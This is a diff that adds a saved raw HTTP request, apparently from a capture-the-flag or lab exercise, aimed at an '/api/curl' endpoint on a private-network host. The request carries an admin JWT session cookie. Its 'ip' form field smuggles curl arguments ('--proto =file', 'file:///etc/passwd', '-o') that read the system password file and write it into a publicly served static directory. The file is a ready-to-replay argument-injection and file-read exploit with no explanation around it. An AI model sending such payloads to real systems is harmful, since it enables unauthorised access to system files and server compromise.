@@ -1,0 +1,14 @@
+POST /api/curl HTTP/1.1
+Host: 192.168.86.250:1337
+Content-Length: 55
+Accept-Language: es-ES,es;q=0.9
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
+Origin: http://192.168.86.250:1337
+Referer: http://192.168.86.250:1337/
+Accept-Encoding: gzip, deflate, br
+Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImlhdCI6MTcyNzExNTQwNn0.CbuC7d8MQTrxqk3q5oRd6lKn05Y1uNe4KwdRO9ZTRlY
+Connection: keep-alive
+
+ip=--proto+=file+file:///etc/passwd+-o+/www/static/test
